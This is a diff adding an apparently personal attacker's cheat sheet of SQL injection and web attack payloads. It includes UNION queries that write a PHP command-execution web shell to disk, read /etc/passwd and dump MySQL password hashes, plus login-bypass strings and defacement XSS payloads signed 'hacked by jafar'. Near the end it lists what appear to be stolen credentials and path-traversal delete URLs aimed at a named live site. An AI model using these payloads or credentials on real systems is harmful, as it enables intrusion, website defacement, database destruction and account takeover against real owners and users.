@@ -1,0 +1,85 @@
+Search ->
+	LIKE '%str'
+	LIKE 'str%'
+	LIKE '%str%'
+	
+	' order by 1 #
+	%' order by 1 #
+	
+	Blind Union 
+		1 - user() = root 
+		2 - priv -> file -> Y
+		3 - path write & read
+			/var/www/html/labs/helper/
+			mysql -> error
+			id[]=1 -> error
+			10 / 0 -> error
+		
+	select File_priv from mysql.user where User = 'root'
+	union select 1,2,3,4,5,6,7,8,9 into outfile '/var/www/html/labs/css/1.txt'
+	union select 1,2,3,4,5,6,7,8,9 into outfile "/var/www/html/labs/css/1.txt"
+	union select 1,0xhex,3,4,5,6,7,8,9 into outfile '/var/'
+	
+	Shell Mysql :
+		1 - user() = root 
+		2 - priv -> file -> Y
+		3 - path write & read
+		union select '<?php system($_GET[c]); ?>',2,3,4,5,6,7,8,9 into outfile '/var/www/html/labs/uploads/cmd1.php'
+		union select "<?php system($_GET[c]); ?>",2,3,4,5,6,7,8,9 into outfile '/var/www/html/labs/uploads/cmd1.php'
+		union select 0xhex,2,3,4,5,6,7,8,9 into outfile '/var/www/html/labs/uploads/cmd1.php'
+	
+	Mysql Read File :
+	
+		1 - user() = root 
+		2 - priv -> file -> Y
+		3 - path write & read
+		union select 1,load_file('/etc/passwd'),3
+		union select 1,load_file("/etc/passwd"),3
+		union select 1,load_file(0x),3
+		
+		 /etc/apache2/apache2.conf
+		
+		get mysql hash password : 
+		union select 1,password,3 from mysql.user
+		*C51CE7EF7058FB59AD45535B9D3912EE3C7A9A57
+		
+	
+	
+SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%multango_user%'		
+	
+	
+Bypass Login :
+	SELECT * FROM tb_admini WHERE 
+	name='$username' and passwd='$password'
+	
+	admin' or 1=1 #
+	' or 1=1 #
+	
+	<script>document.body.innerHTML=`<body style="background-color:#000;color:red;text-align:center;font-size:40px;"><h1>hacked by jafar</h1></body>`;</script>
+	
+	<img src="j" onerror="document.body.innerHTML = '<h1>hacked by jafar</h1>';">
+	
+	<input type="text" onfocus="document.body.innerHTML = '<h1>hacked by jafar</h1>';" autofocus>
+	
+		<input type="text" onfocus="document.body.innerHTML = `<h1>hacked by jafar</h1>`;" autofocus>
+	
+	
+	tvp63159@nbzmr.com
+	oap71507@awsoo.com
+	
+	admin
+	vsjayan@gmail.com
+	bce4a8a677a3f496aeffad77cda4515a
+	Inetsol@123
+	
+	Delete ?
+	http://exclusivescript.net/admin/cms.php?act=del&nimg=../../../db/exclusivescript_services.sql&id=8
+	
+	
+	http://exclusivescript.net/admin/general_settingupd.php?act=del&nimg=../../../db/exclusivescript_services.sql&id=1
+	
+	<img src="1" onerror="document.body.innerHTML=`<body style=background-color:#000;color:red;text-align:center;font-size:40px;><h1>hacked by jafar</h1></body>`;">
+	
+	
+	
+	
